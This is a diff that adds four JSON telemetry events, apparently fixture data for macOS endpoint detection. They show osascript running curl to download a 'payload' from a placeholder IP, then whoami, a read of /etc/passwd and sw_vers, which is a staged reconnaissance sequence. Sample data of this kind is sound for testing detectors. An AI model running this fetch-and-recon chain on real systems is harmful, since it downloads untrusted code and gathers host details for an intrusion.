@@ -1,0 +1,4 @@
+{"event":{"exec":{"target":{"executable":{"path":"/usr/bin/curl"},"ppid":501,"is_platform_binary":true},"args":["curl","-s","-O","http://192.0.2.10/payload"],"cwd":{"path":"/Users/analyst"}}},"process":{"executable":{"path":"/usr/bin/osascript"},"ppid":1},"event_type":9,"time":"2026-07-30T15:00:00Z","seq_num":1}
+{"event":{"exec":{"target":{"executable":{"path":"/usr/bin/whoami"}},"args":["whoami"],"cwd":{"path":"/Users/analyst"}}},"process":{"executable":{"path":"/bin/zsh"}},"event_type":9,"time":"2026-07-30T15:00:01Z","seq_num":2}
+{"event":{"open":{"file":{"path":"/etc/passwd"}}},"process":{"executable":{"path":"/bin/cat"}},"event_type":10,"time":"2026-07-30T15:00:02Z","seq_num":3}
+{"event":{"exec":{"target":{"executable":{"path":"/usr/bin/sw_vers"}},"args":["sw_vers"]}},"process":{"executable":{"path":"/bin/zsh"}},"event_type":9,"time":"2026-07-30T15:00:03Z","seq_num":4}
